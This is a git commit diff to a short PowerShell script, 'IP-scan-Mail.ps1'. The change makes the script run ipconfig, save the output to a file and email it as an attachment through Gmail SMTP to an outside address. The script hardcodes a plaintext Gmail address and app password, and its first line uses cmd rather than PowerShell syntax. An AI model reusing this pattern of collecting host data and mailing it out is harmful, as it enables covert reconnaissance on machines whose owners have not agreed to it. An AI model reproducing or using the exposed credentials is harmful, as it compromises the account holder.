f2f0e3e4b728b5dfd9d1492b1120798c62e248ed
MangoTheSherlock <manuel.saemann1@outlook.de>
2025-03-25 10:31:52 +0100

    Update IP-scan-Mail.ps1

--- IP-scan-Mail.ps1
+++ IP-scan-Mail.ps1
@@ -1,26 +1,28 @@
-# PowerShell E-Mail-Skript
+echo. > output.txt
+ipconfig >> output.txt
 
-# SMTP-Server von Google
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 
-# Deine Anmeldedaten (Google-Adresse und App-Passwort)
 $Username = "osmanharald5@gmail.com"
 $Password = "ovsbxveiojwtoncn"
 
-# E-Mail Details
 $From = "osmanharald5@gmail.com"
-$To = "osmanharald5@gmail.com"  # Empfängeradresse (kann auch eine andere sein)
-$Subject = "Test E-Mail von PowerShell"
-$Body = "Hallo, dies ist eine automatisch gesendete E-Mail aus einem PowerShell-Skript."
+$To = "osmanharald5@gmail.com"
+$Subject = "Test E-Mail mit Anhang (output.txt)"
+$Body = "Hallo, dies ist eine automatisch gesendete E-Mail mit dem Anhang output.txt."
 
-# SMTP Client erstellen und konfigurieren
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
 
-# E-Mail senden
-$SMTPClient.Send($From, $To, $Subject, $Body)
+$MailMessage = New-Object Net.Mail.MailMessage($From, $To, $Subject, $Body)
 
-# Erfolgsmeldung
-Write-Output "E-Mail erfolgreich gesendet!"
+$Attachment = New-Object Net.Mail.Attachment("output.txt")
+$MailMessage.Attachments.Add($Attachment)
+
+$SMTPClient.Send($MailMessage)
+
+Write-Output "E-Mail erfolgreich mit Anhang versendet!"
+
+$Attachment.Dispose()
